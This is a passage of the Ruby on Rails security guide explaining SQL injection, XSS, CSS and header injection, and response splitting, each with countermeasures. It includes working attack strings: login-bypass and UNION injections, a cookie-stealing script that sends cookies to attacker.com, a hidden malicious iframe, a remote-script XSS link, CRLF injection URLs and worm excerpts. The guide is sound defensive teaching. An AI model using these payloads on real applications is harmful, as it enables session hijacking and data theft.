“&lt;sc&lt;script&gt;ript&gt;”.gsub(“&lt;script&gt;”, “”)  But reject
malformed input</p>

<p>Whitelists are also a good approach against the human factor of forgetting
something in the blacklist.</p>

<h3 id="label-SQL+Injection">SQL Injection<span><a href="#label-SQL+Injection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>INFO: <em>Thanks to clever methods, this is hardly a problem in most Rails
applications. However, this is a very devastating and common attack in web
applications, so it is important to understand the problem.</em></p>

<h4 id="label-Introduction">Introduction<span><a href="#label-Introduction">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>SQL injection attacks aim at influencing database queries by manipulating
web application parameters. A popular goal of SQL injection attacks is to
bypass authorization. Another goal is to carry out data manipulation or
reading arbitrary data. Here is an example of how not to use user input
data in a query:</p>

<pre class="ruby"><span class="ruby-constant">Project</span>.<span class="ruby-identifier">where</span>(<span class="ruby-node">&quot;name = &#39;#{params[:name]}&#39;&quot;</span>)
</pre>

<p>This could be in a search action and the user may enter a project&#39;s
name that they want to find. If a malicious user enters &#39; OR 1 –, the
resulting SQL query will be:</p>

<pre>SELECT * FROM projects WHERE name = &#39;&#39; OR 1 --&#39;</pre>

<p>The two dashes start a comment ignoring everything after it. So the query
returns all records from the projects table including those blind to the
user. This is because the condition is true for all records.</p>

<h4 id="label-Bypassing+Authorization">Bypassing Authorization<span><a href="#label-Bypassing+Authorization">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>Usually a web application includes access control. The user enters their
login credentials and the web application tries to find the matching record
in the users table. The application grants access when it finds a record.
However, an attacker may possibly bypass this check with SQL injection. The
following shows a typical database query in Rails to find the first record
in the users table which matches the login credentials parameters supplied
by the user.</p>

<pre class="ruby"><span class="ruby-constant">User</span>.<span class="ruby-identifier">first</span>(<span class="ruby-node">&quot;login = &#39;#{params[:name]}&#39; AND password = &#39;#{params[:password]}&#39;&quot;</span>)
</pre>

<p>If an attacker enters &#39; OR &#39;1&#39;=&#39;1 as the name, and &#39; OR
&#39;2&#39;&gt;&#39;1 as the password, the resulting SQL query will be:</p>

<pre>SELECT * FROM users WHERE login = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; AND password = &#39;&#39; OR &#39;2&#39;&gt;&#39;1&#39; LIMIT 1</pre>

<p>This will simply find the first record in the database, and grants access
to this user.</p>

<h4 id="label-Unauthorized+Reading">Unauthorized Reading<span><a href="#label-Unauthorized+Reading">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>The UNION statement connects two SQL queries and returns the data in one
set. An attacker can use it to read arbitrary data from the database.
Let&#39;s take the example from above:</p>

<pre class="ruby"><span class="ruby-constant">Project</span>.<span class="ruby-identifier">where</span>(<span class="ruby-node">&quot;name = &#39;#{params[:name]}&#39;&quot;</span>)
</pre>

<p>And now let&#39;s inject another query using the UNION statement:</p>

<pre>&#39;) UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --</pre>

<p>This will result in the following SQL query:</p>

<pre>SELECT * FROM projects WHERE (name = &#39;&#39;) UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --&#39;</pre>

<p>The result won&#39;t be a list of projects (because there is no project
with an empty name), but a list of user names and their password. So
hopefully you encrypted the passwords in the database! The only problem for
the attacker is, that the number of columns has to be the same in both
queries. That&#39;s why the second query includes a list of ones (1), which
will be always the value 1, in order to match the number of columns in the
first query.</p>

<p>Also, the second query renames some columns with the AS statement so that
the web application displays the values from the user table. Be sure to
update your Rails <a
href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">to
at least 2.1.1</a>.</p>

<h4 id="label-Countermeasures">Countermeasures<span><a href="#label-Countermeasures">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>Ruby on Rails has a built-in filter for special SQL characters, which will
escape &#39; , “ , NULL character and line breaks. <em>Using
<code>Model.find(id)</code> or <code>Model.find_by_some
thing(something)</code> automatically applies this countermeasure</em>. But
in SQL fragments, especially <em>in conditions fragments
(<code>where(&quot;...&quot;)</code>), the
<code>connection.execute()</code> or <code>Model.find_by_sql()</code>
methods, it has to be applied manually</em>.</p>

<p>Instead of passing a string to the conditions option, you can pass an array
to sanitize tainted strings like this:</p>

<pre class="ruby"><span class="ruby-constant">Model</span>.<span class="ruby-identifier">where</span>(<span class="ruby-string">&quot;login = ? AND password = ?&quot;</span>, <span class="ruby-identifier">entered_user_name</span>, <span class="ruby-identifier">entered_password</span>).<span class="ruby-identifier">first</span>
</pre>

<p>As you can see, the first part of the array is an SQL fragment with
question marks. The sanitized versions of the variables in the second part
of the array replace the question marks. Or you can pass a hash for the
same result:</p>

<pre class="ruby"><span class="ruby-constant">Model</span>.<span class="ruby-identifier">where</span>(<span class="ruby-identifier">login</span><span class="ruby-operator">:</span> <span class="ruby-identifier">entered_user_name</span>, <span class="ruby-identifier">password</span><span class="ruby-operator">:</span> <span class="ruby-identifier">entered_password</span>).<span class="ruby-identifier">first</span>
</pre>

<p>The array or hash form is only available in model instances. You can try
<code>sanitize_sql()</code> elsewhere. <em>Make it a habit to think about
the security consequences when using an external string in SQL</em>.</p>

<h3 id="label-Cross-Site+Scripting+-28XSS-29">Cross-Site Scripting (XSS)<span><a href="#label-Cross-Site+Scripting+-28XSS-29">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>INFO: <em>The most widespread, and one of the most devastating security
vulnerabilities in web applications is XSS. This malicious attack injects
client-side executable code. Rails provides helper methods to fend these
attacks off.</em></p>

<h4 id="label-Entry+Points">Entry Points<span><a href="#label-Entry+Points">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>An entry point is a vulnerable URL and its parameters where an attacker can
start an attack.</p>

<p>The most common entry points are message posts, user comments, and guest
books, but project titles, document names and search result pages have also
been vulnerable - just about everywhere where the user can input data. But
the input does not necessarily have to come from input boxes on web sites,
it can be in any URL parameter - obvious, hidden or internal. Remember that
the user may intercept any traffic. Applications, such as the <a
href="http://livehttpheaders.mozdev.org/">Live HTTP Headers Firefox
plugin</a>, or client-site proxies make it easy to change requests.</p>

<p>XSS attacks work like this: An attacker injects some code, the web
application saves it and displays it on a page, later presented to a
victim. Most XSS examples simply display an alert box, but it is more
powerful than that. XSS can steal the cookie, hijack the session, redirect
the victim to a fake website, display advertisements for the benefit of the
attacker, change elements on the web site to get confidential information
or install malicious software through security holes in the web browser.</p>

<p>During the second half of 2007, there were 88 vulnerabilities reported in
Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The <a
href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec
Global Internet Security threat report</a> also documented 239 browser
plug-in vulnerabilities in the last six months of 2007. <a
href="http://pandalabs.pandasecurity.com/mpack-uncovered/">Mpack</a> is a
very active and up-to-date attack framework which exploits these
vulnerabilities. For criminal hackers, it is very attractive to exploit an
SQL-Injection vulnerability in a web application framework and insert
malicious code in every textual table column. In April 2008 more than
510,000 sites were hacked like this, among them the British government,
United Nations, and many more high targets.</p>

<p>A relatively new, and unusual, form of entry points are banner
advertisements. In earlier 2008, malicious code appeared in banner ads on
popular sites, such as MySpace and Excite, according to <a
href="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/">Trend
Micro</a>.</p>

<h4 id="label-HTML-2FJavaScript+Injection">HTML/JavaScript Injection<span><a href="#label-HTML-2FJavaScript+Injection">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>The most common XSS language is of course the most popular client-side
scripting language JavaScript, often in combination with HTML. <em>Escaping
user input is essential</em>.</p>

<p>Here is the most straightforward test to check for XSS:</p>

<pre>&lt;script&gt;alert(&#39;Hello&#39;);&lt;/script&gt;</pre>

<p>This JavaScript code will simply display an alert box. The next examples do
exactly the same, only in very uncommon places:</p>

<pre>&lt;img src=javascript:alert(&#39;Hello&#39;)&gt;
&lt;table background=&quot;javascript:alert(&#39;Hello&#39;)&quot;&gt;</pre>

<h5 id="label-Cookie+Theft">Cookie Theft<span><a href="#label-Cookie+Theft">&para;</a> <a href="#top">&uarr;</a></span></h5>

<p>These examples don&#39;t do any harm so far, so let&#39;s see how an
attacker can steal the user&#39;s cookie (and thus hijack the user&#39;s
session). In JavaScript you can use the document.cookie property to read
and write the document&#39;s cookie. JavaScript enforces the same origin
policy, that means a script from one domain cannot access cookies of
another domain. The document.cookie property holds the cookie of the
originating web server. However, you can read and write this property, if
you embed the code directly in the HTML document (as it happens with XSS).
Inject this anywhere in your web application to see your own cookie on the
result page:</p>

<pre>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</pre>

<p>For an attacker, of course, this is not useful, as the victim will see
their own cookie. The next example will try to load an image from the URL
<a href="http://www.attacker.com">www.attacker.com</a>/ plus the cookie. Of
course this URL does not exist, so the browser displays nothing. But the
attacker can review their web server&#39;s access log files to see the
victim&#39;s cookie.</p>

<pre>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://www.attacker.com/&#39; + document.cookie + &#39;&quot;&gt;&#39;);&lt;/script&gt;</pre>

<p>The log files on <a href="www.attacker.com">www.attacker.com</a> will read
like this:</p>

<pre>GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</pre>

<p>You can mitigate these attacks (in the obvious way) by adding the <a
href="http://dev.rubyonrails.org/ticket/8895">httpOnly</a> flag to cookies,
so that document.cookie may not be read by JavaScript. Http only cookies
can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still
considering, it ignores the option. But other, older browsers (such as
WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be
warned that cookies <a
href="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/">will
still be visible using Ajax</a>, though.</p>

<h5 id="label-Defacement">Defacement<span><a href="#label-Defacement">&para;</a> <a href="#top">&uarr;</a></span></h5>

<p>With web page defacement an attacker can do a lot of things, for example,
present false information or lure the victim on the attackers web site to
steal the cookie, login credentials or other sensitive data. The most
popular way is to include code from external sources by iframes:</p>

<pre>&lt;iframe name=&quot;StatPage&quot; src=&quot;http://58.xx.xxx.xxx&quot; width=5 height=5 style=&quot;display:none&quot;&gt;&lt;/iframe&gt;</pre>

<p>This loads arbitrary HTML and/or JavaScript from an external source and
embeds it as part of the site. This iframe is taken from an actual attack
on legitimate Italian sites using the <a
href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack
framework</a>. Mpack tries to install malicious software through security
holes in the web browser - very successfully, 50% of the attacks succeed.</p>

<p>A more specialized attack could overlap the entire web site or display a
login form, which looks the same as the site&#39;s original, but transmits
the user name and password to the attacker&#39;s site. Or it could use CSS
and/or JavaScript to hide a legitimate link in the web application, and
display another one at its place which redirects to a fake web site.</p>

<p>Reflected injection attacks are those where the payload is not stored to
present it to the victim later on, but included in the URL. Especially
search forms fail to escape the search string. The following link presented
a page which stated that “George Bush appointed a 9 year old boy to be the
chairperson…”:</p>

<pre>http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--</pre>

<h5 id="label-Countermeasures">Countermeasures<span><a href="#label-Countermeasures">&para;</a> <a href="#top">&uarr;</a></span></h5>

<p><em>It is very important to filter malicious input, but it is also
important to escape the output of the web application</em>.</p>

<p>Especially for XSS, it is important to do <em>whitelist input filtering
instead of blacklist</em>. Whitelist filtering states the values allowed as
opposed to the values not allowed. Blacklists are never complete.</p>

<p>Imagine a blacklist deletes “script” from the user input. Now the attacker
injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;”
remains. Earlier versions of Rails used a blacklist approach for the
strip_tags(), strip_links() and sanitize() method. So this kind of
injection was possible:</p>

<pre class="ruby"><span class="ruby-identifier">strip_tags</span>(<span class="ruby-string">&quot;some&lt;&lt;b&gt;script&gt;alert(&#39;hello&#39;)&lt;&lt;/b&gt;/script&gt;&quot;</span>)
</pre>

<p>This returned “some&lt;script&gt;alert(&#39;hello&#39;)&lt;/script&gt;”,
which makes an attack work. That&#39;s why a whitelist approach is better,
using the updated Rails 2 method sanitize():</p>

<pre class="ruby"><span class="ruby-identifier">tags</span> = <span class="ruby-node">%w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)</span>
<span class="ruby-identifier">s</span> = <span class="ruby-identifier">sanitize</span>(<span class="ruby-identifier">user_input</span>, <span class="ruby-identifier">tags</span><span class="ruby-operator">:</span> <span class="ruby-identifier">tags</span>, <span class="ruby-identifier">attributes</span><span class="ruby-operator">:</span> <span class="ruby-node">%w(href title)</span>)
</pre>

<p>This allows only the given tags and does a good job, even against all kinds
of tricks and malformed tags.</p>

<p>As a second step, <em>it is good practice to escape all output of the
application</em>, especially when re-displaying user input, which
hasn&#39;t been input-filtered (as in the search form example earlier on).
<em>Use <code>escapeHTML()</code> (or its alias <code>h()</code>)
method</em> to replace the HTML input characters &amp;, “, &lt;, &gt; by
their uninterpreted representations in HTML (<code>&amp;amp;</code>,
<code>&amp;quot;</code>, <code>&amp;lt</code>;, and <code>&amp;gt;</code>).
However, it can easily happen that the programmer forgets to use it, so _it
is recommended to use the SafeErb gem. SafeErb reminds you to escape
strings from external sources.</p>

<h5 id="label-Obfuscation+and+Encoding+Injection">Obfuscation and Encoding Injection<span><a href="#label-Obfuscation+and+Encoding+Injection">&para;</a> <a href="#top">&uarr;</a></span></h5>

<p>Network traffic is mostly based on the limited Western alphabet, so new
character encodings, such as Unicode, emerged, to transmit characters in
other languages. But, this is also a threat to web applications, as
malicious code can be hidden in different encodings that the web browser
might be able to process, but the web application might not. Here is an
attack vector in UTF-8 encoding:</p>

<pre>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</pre>

<p>This example pops up a message box. It will be recognized by the above
sanitize() filter, though. A great tool to obfuscate and encode strings,
and thus “get to know your enemy”, is the <a
href="https://hackvertor.co.uk/public">Hackvertor</a>. Rails&#39;
sanitize() method does a good job to fend off encoding attacks.</p>

<h4 id="label-Examples+from+the+Underground">Examples from the Underground<span><a href="#label-Examples+from+the+Underground">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p><em>In order to understand today&#39;s attacks on web applications,
it&#39;s best to take a look at some real-world attack vectors.</em></p>

<p>The following is an excerpt from the <a
href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1">Js.Yamanner@m</a>
Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. It
appeared on June 11, 2006 and was the first webmail interface worm:</p>

<pre>&lt;img src=&#39;http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif&#39;
  target=&quot;&quot;onload=&quot;var http_request = false;    var Email = &#39;&#39;;
  var IDList = &#39;&#39;;   var CRumb = &#39;&#39;;   function makeRequest(url, Func, Method,Param) { ...</pre>

<p>The worms exploits a hole in Yahoo&#39;s HTML/JavaScript filter, which
usually filters all target and onload attributes from tags (because there
can be JavaScript). The filter is applied only once, however, so the onload
attribute with the worm code stays in place. This is a good example why
blacklist filters are never complete and why it is hard to allow
HTML/JavaScript in a web application.</p>

<p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for
four Italian webmail services. Find more details on <a
href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario
Valotta’s paper</a>. Both webmail worms have the goal to harvest email
addresses, something a criminal hacker could make money with.</p>

<p>In December 2006, 34,000 actual user names and passwords were stolen in a
<a
href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace
phishing attack</a>. The idea of the attack was to create a profile page
named “login_home_index_html”, so the URL looked very convincing.
Specially-crafted HTML and CSS was used to hide the genuine MySpace content
from the page and instead display its own login form.</p>

<p>The MySpace Samy worm will be discussed in the CSS Injection section.</p>

<h3 id="label-CSS+Injection">CSS Injection<span><a href="#label-CSS+Injection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>INFO: <em>CSS Injection is actually JavaScript injection, because some
browsers (IE, some versions of Safari and others) allow JavaScript in CSS.
Think twice about allowing custom CSS in your web application.</em></p>

<p>CSS Injection is explained best by a well-known worm, the <a
href="http://namb.la/popular/tech.html">MySpace Samy worm</a>. This worm
automatically sent a friend request to Samy (the attacker) simply by
visiting his profile. Within several hours he had over 1 million friend
requests, but it creates too much traffic on MySpace, so that the site goes
offline. The following is a technical explanation of the worm.</p>

<p>MySpace blocks many tags, however it allows CSS. So the worm&#39;s author
put JavaScript into CSS like this:</p>

<pre>&lt;div style=&quot;background:url(&#39;javascript:alert(1)&#39;)&quot;&gt;</pre>

<p>So the payload is in the style attribute. But there are no quotes allowed
in the payload, because single and double quotes have already been used.
But JavaScript has a handy eval() function which executes any string as
code.</p>

<pre>&lt;div id=&quot;mycode&quot; expr=&quot;alert(&#39;hah!&#39;)&quot; style=&quot;background:url(&#39;javascript:eval(document.all.mycode.expr)&#39;)&quot;&gt;</pre>

<p>The eval() function is a nightmare for blacklist input filters, as it
allows the style attribute to hide the word “innerHTML”:</p>

<pre class="ruby"><span class="ruby-identifier">alert</span>(<span class="ruby-identifier">eval</span>(<span class="ruby-string">&#39;document.body.inne&#39;</span> <span class="ruby-operator">+</span> <span class="ruby-string">&#39;rHTML&#39;</span>));
</pre>

<p>The next problem was MySpace filtering the word “javascript”, so the author
used “java&lt;NEWLINE&gt;script” to get around this:</p>

<pre>&lt;div id=&quot;mycode&quot; expr=&quot;alert(&#39;hah!&#39;)&quot; style=&quot;background:url(&#39;java↵ script:eval(document.all.mycode.expr)&#39;)&quot;&gt;</pre>

<p>Another problem for the worm&#39;s author were CSRF security tokens.
Without them he couldn&#39;t send a friend request over POST. He got around
it by sending a GET to the page right before adding a user and parsing the
result for the CSRF token.</p>

<p>In the end, he got a 4 KB worm, which he injected into his profile page.</p>

<p>The <a
href="http://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a>
CSS property proved to be another way to introduce JavaScript in CSS in
Gecko-based browsers (Firefox, for example).</p>

<h4 id="label-Countermeasures">Countermeasures<span><a href="#label-Countermeasures">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>This example, again, showed that a blacklist filter is never complete.
However, as custom CSS in web applications is a quite rare feature, it may
be hard to find a good whitelist CSS filter. <em>If you want to allow
custom colors or images, you can allow the user to choose them and build
the CSS in the web application</em>. Use Rails&#39; <code>sanitize()</code>
method as a model for a whitelist CSS filter, if you really need one.</p>

<h3 id="label-Textile+Injection">Textile Injection<span><a href="#label-Textile+Injection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>If you want to provide text formatting other than HTML (due to security),
use a mark-up language which is converted to HTML on the server-side. <a
href="http://redcloth.org/">RedCloth</a> is such a language for Ruby, but
without precautions, it is also vulnerable to XSS.</p>

<p>For example, RedCloth translates <code><em>test</em></code> to
&lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the
current version 3.0.4, it is still vulnerable to XSS. Get the <a
href="http://www.redcloth.org">all-new version 4</a> that removed serious
bugs. However, even that version has <a
href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">some
security bugs</a>, so the countermeasures still apply. Here is an example
for version 3.0.4:</p>

<pre class="ruby"><span class="ruby-constant">RedCloth</span>.<span class="ruby-identifier">new</span>(<span class="ruby-string">&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;</span>).<span class="ruby-identifier">to_html</span>
<span class="ruby-comment"># =&gt; &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>
</pre>

<p>Use the :filter_html option to remove HTML which was not created by the
Textile processor.</p>

<pre class="ruby"><span class="ruby-constant">RedCloth</span>.<span class="ruby-identifier">new</span>(<span class="ruby-string">&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;</span>, [:<span class="ruby-identifier">filter_html</span>]).<span class="ruby-identifier">to_html</span>
<span class="ruby-comment"># =&gt; &quot;alert(1)&quot;</span>
</pre>

<p>However, this does not filter all HTML, a few tags will be left (by
design), for example &lt;a&gt;:</p>

<pre class="ruby"><span class="ruby-constant">RedCloth</span>.<span class="ruby-identifier">new</span>(<span class="ruby-string">&quot;&lt;a href=&#39;javascript:alert(1)&#39;&gt;hello&lt;/a&gt;&quot;</span>, [:<span class="ruby-identifier">filter_html</span>]).<span class="ruby-identifier">to_html</span>
<span class="ruby-comment"># =&gt; &quot;&lt;p&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hello&lt;/a&gt;&lt;/p&gt;&quot;</span>
</pre>

<h4 id="label-Countermeasures">Countermeasures<span><a href="#label-Countermeasures">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>It is recommended to <em>use RedCloth in combination with a whitelist input
filter</em>, as described in the countermeasures against XSS section.</p>

<h3 id="label-Ajax+Injection">Ajax Injection<span><a href="#label-Ajax+Injection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>The same security precautions have to be taken for Ajax actions
as for “normal” ones. There is at least one exception, however: The output
has to be escaped in the controller already, if the action doesn&#39;t
render a view.</em></p>

<p>If you use the <a
href="https://rubygems.org/gems/in_place_editing">in_place_editor
plugin</a>, or actions that return a string, rather than rendering a view,
<em>you have to escape the return value in the action</em>. Otherwise, if
the return value contains a XSS string, the malicious code will be executed
upon return to the browser. Escape any input value using the h() method.</p>

<h3 id="label-Command+Line+Injection">Command Line Injection<span><a href="#label-Command+Line+Injection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Use user-supplied command line parameters with caution.</em></p>

<p>If your application has to execute commands in the underlying operating
system, there are several methods in Ruby: exec(command), syscall(command),
system(command) and <code>command</code>. You will have to be especially
careful with these functions if the user may enter the whole command, or a
part of it. This is because in most shells, you can execute another command
at the end of the first one, concatenating them with a semicolon (;) or a
vertical bar (|).</p>

<p>A countermeasure is to <em>use the <code>system(command, parameters)</code>
method which passes command line parameters safely</em>.</p>

<pre class="ruby"><span class="ruby-identifier">system</span>(<span class="ruby-string">&quot;/bin/echo&quot;</span>,<span class="ruby-string">&quot;hello; rm *&quot;</span>)
<span class="ruby-comment"># prints &quot;hello; rm *&quot; and does not delete files</span>
</pre>

<h3 id="label-Header+Injection">Header Injection<span><a href="#label-Header+Injection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>WARNING: <em>HTTP headers are dynamically generated and under certain
circumstances user input may be injected. This can lead to false
redirection, XSS or HTTP response splitting.</em></p>

<p>HTTP request headers have a Referer, User-Agent (client software), and
Cookie field, among others. Response headers for example have a status
code, Cookie and Location (redirection target URL) field. All of them are
user-supplied and may be manipulated with more or less effort. <em>Remember
to escape these header fields, too.</em> For example when you display the
user agent in an administration area.</p>

<p>Besides that, it is <em>important to know what you are doing when building
response headers partly based on user input.</em> For example you want to
redirect the user back to a specific page. To do that you introduced a
“referer” field in a form to redirect to the given address:</p>

<pre class="ruby"><span class="ruby-identifier">redirect_to</span> <span class="ruby-identifier">params</span>[:<span class="ruby-identifier">referer</span>]
</pre>

<p>What happens is that Rails puts the string into the Location header field
and sends a 302 (redirect) status to the browser. The first thing a
malicious user would do, is this:</p>

<pre>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld</pre>

<p>And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a
hacker may inject arbitrary header fields; for example like this:</p>

<pre>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld</pre>

<p>Note that “%0d%0a” is URL-encoded for “rn” which is a carriage-return and
line-feed (CRLF) in Ruby. So the resulting HTTP header for the second
example will be the following because the second Location header field
overwrites the first.</p>

<pre>HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld</pre>

<p>So <em>attack vectors for Header Injection are based on the injection of
CRLF characters in a header field.</em> And what could an attacker do with
a false redirection? They could redirect to a phishing site that looks the
same as yours, but ask to login again (and sends the login credentials to
the attacker). Or they could install malicious software through browser
security holes on that site. Rails 2.1.2 escapes these characters for the
Location field in the <code>redirect_to</code> method. <em>Make sure you do
it yourself when you build other header fields with user input.</em></p>

<h4 id="label-Response+Splitting">Response Splitting<span><a href="#label-Response+Splitting">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>If Header Injection was possible, Response Splitting might be, too. In
HTTP, the header block is followed by two CRLFs and the actual data
(usually HTML). The idea of Response Splitting is to inject two CRLFs into
a header field, followed by another response with malicious HTML. The
response will be:</p>

<pre>HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html

HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html

&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html</pre>

<p>Under certain circumstances this would present the malicious HTML to the
victim. However, this only seems to work with Keep-Alive connections (and
many browsers are using one-time connections). But you can&#39;t rely on
this. <em>In any case this is a serious bug, and you should update your
Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus
response splitting) risks.</em></p>

<h2 id="label-Unsafe+Query+Generation">Unsafe Query Generation<span><a href="#label-Unsafe+Query+Generation">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>Due to the way Active Record interprets parameters in combination with the
way that Rack parses query parameters it was possible to issue unexpected
database queries with <code>IS NULL</code> where clauses. As a response to
that security issue (<a
href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ">CVE-2012-2660</a>,
<a
href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ">CVE-2012-2694</a>
and <a
href="https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ">CVE-2013-0155</a>)
<code>deep_munge</code> method was introduced as a solution to keep Rails
secure by default.</p>

<p>Example of vulnerable code that could be used by attacker, if
<code>deep_munge</code> wasn&#39;t performed is:</p>

<pre class="ruby"><span class="ruby-keyword">unless</span> <span class="ruby-identifier">params</span>[:<span class="ruby-identifier">token</span>].<span class="ruby-identifier">nil?</span>
  <span class="ruby-identifier">user</span> = <span class="ruby-constant">User</span>.<span class="ruby-identifier">find_by_token</span>(<span class="ruby-identifier">params</span>[:<span class="ruby-identifier">token</span>])
  <span class="ruby-identifier">user</span>.<span class="ruby-identifier">reset_password!</span>
<span class="ruby-keyword">end</span>
</pre>

<p>When <code>params[:token]</code> is one of: <code>[]</code>,
<code>[nil]</code>, <code>[nil, nil, ...]</code> or <code>[&#39;foo&#39;,
nil]</code> it will bypass the test for <code>nil</code>, but <code>IS
NULL</code> or <code>IN (&#39;foo&#39;, NULL)</code> where clauses still
will be added to the SQL query.</p>

<p>To keep rails secure by default, <code>deep_munge</code> replaces some of
the values with <code>nil</code>. Below table shows what the parameters
look like based on <code>JSON</code> sent in request:</p>

<p>| JSON | Parameters | |———————————–|————————–| | <code>{
&quot;person&quot;: null }</code> | <code>{ :person =&gt; nil }</code> | |
<code>{ &quot;person&quot;: [] }</code> | <code>{ :person =&gt; nil
}</code> | | <code>{ &quot;person&quot;: [null] }</code> | <code>{ :person
=&gt; nil }</code> | | <code>{ &quot;person&quot;: [null, null, ...]
}</code> | <code>{ :person =&gt; nil }</code> | | <code>{
&quot;person&quot;: [&quot;foo&quot;, null] }</code> | <code>{ :person
=&gt; [&quot;foo&quot;] }</code> |</p>

<p>It is possible to return to old behaviour and disable
<code>deep_munge</code> configuring your application if you are aware of
the risk and know how to handle it:</p>

<pre class="ruby"><span class="ruby-identifier">config</span>.<span class="ruby-identifier">action_dispatch</span>.<span class="ruby-identifier">perform_deep_munge</span> = <span class="ruby-keyword">false</span>
</pre>

<h2 id="label-Default+Headers">Default Headers<span><a href="#label-Default+Headers">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>Every HTTP response from your Rails application receives the following
default security headers.</p>

<pre class="ruby"><span class="ruby-identifier">config</span>.<span class="ruby-identifier">action_dispatch</span>.<span class="ruby-identifier">default_headers</span> = {
  <span class="ruby-string">&#39;X-Frame-Options&#39;</span> =<span class="ruby-operator">&gt;</span> <span class="ruby-string">&#39;SAMEORIGIN&#39;</span>,
  <span class="ruby-string">&#39;X-XSS-Protection&#39;</span> =<span class="ruby-operator">&gt;</span> <span class="ruby-string">&#39;1; mode=block&#39;</span>,
  <span class="ruby-string">&#39;X-Content-Type-Options&#39;</span> =<span class="ruby-operator">&gt;</span> <span class="ruby-string">&#39;nosniff&#39;</span>
}
</pre>

<p>You can configure default headers in <code>config/application.rb</code>.</p>

<pre class="ruby"><span class="ruby-identifier">config</span>.<span class="ruby-identifier">action_dispatch</span>.<span class="ruby-identifier">default_headers</span> = {
  <span class="ruby-string">&#39;Header-Name&#39;</span> =<span class="ruby-operator">&gt;</span> <span class="ruby-string">&#39;Header-Value&#39;</span>,
  <span class="ruby-string">&#39;X-Frame-Options&#39;</span> =<span class="ruby-operator">&gt;</span> <span class="ruby-string">&#39;DENY&#39;</span>
}
</pre>

<p>Or you can remove them.</p>

